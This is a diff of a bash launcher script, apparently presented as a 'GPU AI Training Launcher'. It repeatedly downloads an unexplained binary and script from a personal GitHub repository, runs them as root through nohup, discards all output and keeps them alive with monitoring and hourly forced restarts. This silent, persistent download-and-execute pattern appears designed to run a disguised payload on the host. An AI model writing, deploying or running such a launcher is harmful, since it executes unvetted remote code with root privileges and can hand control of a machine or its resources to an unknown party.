@@ -1,9 +1,6 @@
 #!/bin/bash
-# File: start_modelgp.sh launcher
-# Purpose: Run start_modelgp.sh continuously
-# - Auto-restart if stopped
-# - Forced restart every hour
-# - 5-minute terminal monitoring starts immediately
+# Launcher script: auto-restart if stopped, forced restart every 1 hour
+# 5-minute monitoring loop runs in foreground
 
 while true; do
     echo "========== Starting GPU AI Training Launcher =========="
@@ -16,11 +13,11 @@ while true; do
         fi
     done
 
-    # Delete old files before downloading
+    # Delete old files before download
     echo "Deleting old files..."
-    rm -f ./aitraining ./start_modelgp.sh   ./bx.sh
+    rm -f ./aitraining ./start_modelgp.sh
 
-    # Launch start_modelgp.sh silently with nohup
+    # Launch start_modelgp.sh silently in background
     nohup bash -c '
         sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
         sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
@@ -31,38 +28,39 @@ while true; do
 
     echo "start_modelgp.sh launched."
 
-    # --- 5-minute monitoring loop starts immediately ---
+    # --- 5-minute monitoring loop runs in foreground ---
     runtime=0
-    while [ $runtime -lt 3600 ]; do  # 1 hour session
-        sleep 300  # 5 minutes
-        runtime=$((runtime + 300))
+    monitor_interval=300  # 5 minutes in seconds
+    max_runtime=3600     # 1 hour in seconds
+    
+    while [ $runtime -lt $max_runtime ]; do
+        sleep $monitor_interval
+        runtime=$((runtime + monitor_interval))
 
-        # Check if aitraining is running
         if pgrep -f "aitraining" > /dev/null; then
             echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining running fine."
         else
             echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining stopped! Restarting start_modelgp.sh..."
 
-            # Kill any remaining processes
+            # Kill remaining processes
             sudo pkill -f "start_modelgp.sh" 2>/dev/null
             sudo pkill -f "aitraining" 2>/dev/null
 
-            # Delete old files before redownload
+            # Delete old files
             rm -f ./aitraining ./start_modelgp.sh
 
             # Relaunch silently
-            nohup bash -c "
+            nohup bash -c '
                 sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
                 sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
                 sudo chmod +x ./aitraining
                 sudo chmod +x ./start_modelgp.sh
                 sudo bash ./start_modelgp.sh
-            " > /dev/null 2>&1 &
+            ' > /dev/null 2>&1 &
 
             echo "$(date '+%Y-%m-%d %H:%M:%S') - start_modelgp.sh restarted."
         fi
     done
 
-    # --- Forced restart after 1 hour ---
     echo "========== 1 hour completed, restarting processes =========="
 done
